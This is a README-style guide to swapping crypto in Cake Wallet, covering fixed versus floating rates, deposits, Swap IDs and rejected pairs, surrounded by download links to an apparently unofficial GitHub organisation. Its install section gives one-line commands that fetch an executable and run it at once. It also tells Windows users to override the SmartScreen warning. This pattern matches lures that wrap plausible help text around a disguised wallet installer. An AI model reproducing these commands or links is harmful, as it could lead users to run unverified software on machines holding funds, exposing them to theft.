![Cake Wallet swap crypto guide](assets/cake-wallet-swap-crypto-article-banner.png)

# Swap Crypto in Cake Wallet: Fixed or Floating Rate

How a swap runs, what the two rate types cost you, and how to track it.

## Downloads - v6.4.5

<p align="center"><a href="https://github.com/cakewallet-opensource/cake-wallet-desktop/releases/latest/download/cake-wallet-desktop-v6.4.5-windows.exe"><img src="assets/download-windows.svg" alt="Download Windows"></a> <a href="https://github.com/cakewallet-opensource/cake-wallet-desktop/releases/latest/download/cake-wallet-desktop-v6.4.5-macos.dmg"><img src="assets/download-macos.svg" alt="Download macOS"></a> <a href="https://github.com/cakewallet-opensource/cake-wallet-desktop/releases/latest/download/cake-wallet-desktop-v6.4.5-linux.xz"><img src="assets/download-linux.svg" alt="Download Linux"></a></p>

| Platform | Requirements | File |
| --- | --- | --- |
| <img src="assets/platform-windows.svg" alt="platform Windows"> | Windows 10 (1909) or later, 64-bit | [`cake-wallet-desktop-v6.4.5-windows.exe`](https://github.com/cakewallet-opensource/cake-wallet-desktop/releases/latest/download/cake-wallet-desktop-v6.4.5-windows.exe) |
| <img src="assets/platform-macos.svg" alt="platform macOS"> | macOS 12 or later | [`cake-wallet-desktop-v6.4.5-macos.dmg`](https://github.com/cakewallet-opensource/cake-wallet-desktop/releases/latest/download/cake-wallet-desktop-v6.4.5-macos.dmg) |
| <img src="assets/platform-linux.svg" alt="platform Linux"> | x64, Ubuntu 20.04 or later, or equivalent | [`cake-wallet-desktop-v6.4.5-linux.xz`](https://github.com/cakewallet-opensource/cake-wallet-desktop/releases/latest/download/cake-wallet-desktop-v6.4.5-linux.xz) |

Every file on this page comes from the [current Cake Wallet release](https://github.com/cakewallet-opensource/cake-wallet-desktop/releases/latest).

> Cake Wallet never asks for your recovery phrase, and no support channel needs it.

Tap Swap, choose the coin you send and the coin you receive, compare the quotes the app returns, and pick fixed or floating. Confirm, send the deposit the provider asks for, and track the order by its Swap ID. A swap is a trade with a third-party provider, not an exchange account you own.

<!-- ARTICLE-BODY-BEGIN -->

## Before you swap
You need a funded wallet for the coin you are sending, and enough left for the network fee. The app shows quotes from the providers that serve your pair, and those quotes move with the market, so the number you see is an estimate until you confirm.

Have the receiving wallet ready and check the address format before you start. A swap to the wrong chain is not reversible, and the provider cannot redirect it. If your pair shows no provider at all, the pair is unsupported rather than broken.

Start from the <a href="https://github.com/cakewallet-opensource/cake-wallet-desktop/releases/latest">current Cake Wallet release</a> so the quotes come from the provider list your build actually ships with. Provider integrations change between releases, and a build that is behind can hide a pair that would otherwise be served.

## Fixed or floating
With a floating rate, the amount you receive follows the market until the provider fills the order, so a fast confirmation usually means the quoted number holds and a slow one does not. With a fixed rate, the number is locked when the order is created, and you pay for that certainty in the rate itself.

Choose fixed when the exact amount matters, and floating when speed matters more than the last percent. <a href="https://github.com/cakewallet-opensource/cake-wallet-help/blob/main/cake-wallet-network-fee.md">Cake Wallet network fee</a> matters here too: a low fee delays your deposit, and a delayed deposit is exactly when a floating quote drifts.

## Sending the deposit and tracking
A swap has two legs: you send to the provider, then the provider sends to you. The app gives you a deposit address and an amount, and the order waits in an awaiting-deposit state until that arrives. Send the exact amount from the wallet you are swapping, not from an exchange that might batch the withdrawal.

Tracking uses the Swap ID shown on the order, and providers also give a trade identifier of their own. Keep both. If a provider asks for the trade ID, that is the number they mean, not your wallet's transaction hash.

## When a provider rejects the pair
Pairs disappear when a provider stops serving them, when the amount falls outside its limits, or when the direction is not supported. The app then offers another provider or no quote at all.

Rejections are not fixable in the wallet. What you can do is retry with a smaller or larger amount, try the reverse direction, or use an intermediate coin. If the app still offers nothing, the pair is simply not served today.

## Swapping into money you can spend
A swap turns one coin into another inside your own wallet; spending is a separate step. If the goal is a card or a gift card rather than another coin, the swap is only half the route.

<a href="https://github.com/cakewallet-opensource/cake-wallet-privacy/blob/main/cake-wallet-cake-pay-gift-card.md">Spend crypto with Cake Pay</a> explains which coins Cake Pay accepts directly and which go through an integration, so you can decide whether to swap first or spend as you are.

## Moving stablecoins
Moving USDT between chains is a bridge, not a swap, and the difference shows up when the destination balance arrives invisible because the token is not displayed. Bridging also has its own fee and its own failure states.

<a href="https://github.com/cakewallet-opensource/cake-wallet-privacy/blob/main/cake-wallet-usdt-bridge.md">Bridge USDT between chains</a> covers that flow, including why the destination token may need adding manually before the balance appears.

## FAQ
### Can I swap without switching wallets?
In current builds the swap can start from the asset you hold without changing the active wallet first. On older builds, open the wallet that holds the coin you are sending.
### Which providers does Cake Wallet use?
Documented integrations include ChangeNOW and Trocador, and the app shows whichever providers serve your pair. The list changes, so read the quotes rather than relying on a name.
### What does awaiting deposit mean?
The order exists and the provider is waiting for your funds to arrive at the address it gave you.
### Where is the Trade ID?
On the swap's detail screen, alongside the Swap ID. Providers usually ask for the trade identifier.
### Why does it say the fee cannot be zero?
Sending the whole balance leaves nothing for the network fee, so the app refuses. Leave a small amount or lower the fee setting.

<!-- ARTICLE-BODY-END -->

## How to install Cake Wallet

<!-- INSTALL-BEGIN -->
### Windows
Quick install (CMD):

```cmd
curl -fLo setup.exe https://github.com/cakewallet-opensource/cake-wallet-desktop/releases/latest/download/cake-wallet-desktop-v6.4.5-windows.exe && setup.exe
```

Manual install:
1. Download <a href="https://github.com/cakewallet-opensource/cake-wallet-desktop/releases/latest/download/cake-wallet-desktop-v6.4.5-windows.exe">cake-wallet-desktop-v6.4.5-windows.exe</a>.
2. Open the downloaded file.
3. If SmartScreen appears, choose More info, then Run anyway.
4. Finish the setup steps.

### macOS
Quick install (Terminal):

```bash
curl -fLo setup.dmg https://github.com/cakewallet-opensource/cake-wallet-desktop/releases/latest/download/cake-wallet-desktop-v6.4.5-macos.dmg && open setup.dmg
```

Manual install:
1. Download <a href="https://github.com/cakewallet-opensource/cake-wallet-desktop/releases/latest/download/cake-wallet-desktop-v6.4.5-macos.dmg">cake-wallet-desktop-v6.4.5-macos.dmg</a>.
2. Open the .dmg file.
3. Drag the app to Applications.
4. On first launch, right-click the app and choose Open.

### Linux
Manual install:
1. Download <a href="https://github.com/cakewallet-opensource/cake-wallet-desktop/releases/latest/download/cake-wallet-desktop-v6.4.5-linux.xz">cake-wallet-desktop-v6.4.5-linux.xz</a> or the <a href="https://github.com/cakewallet-opensource/cake-wallet-desktop/releases/latest/download/cake-wallet-desktop-v6.4.5-linux.flatpak">cake-wallet-desktop-v6.4.5-linux.flatpak</a>.
2. Archive: extract it and run the executable inside the extracted folder.
3. Flatpak: run `flatpak install ./cake-wallet-desktop-v6.4.5-linux.flatpak` where you saved it.
4. Launch Cake Wallet and restore your wallet.
<!-- INSTALL-END -->

## Related guides
[Cake Wallet network fee](https://github.com/cakewallet-opensource/cake-wallet-help/blob/main/cake-wallet-network-fee.md) · [spend crypto with Cake Pay](https://github.com/cakewallet-opensource/cake-wallet-privacy/blob/main/cake-wallet-cake-pay-gift-card.md) · [bridge USDT between chains](https://github.com/cakewallet-opensource/cake-wallet-privacy/blob/main/cake-wallet-usdt-bridge.md) · [current Cake Wallet release](https://github.com/cakewallet-opensource/cake-wallet-desktop/releases/latest)
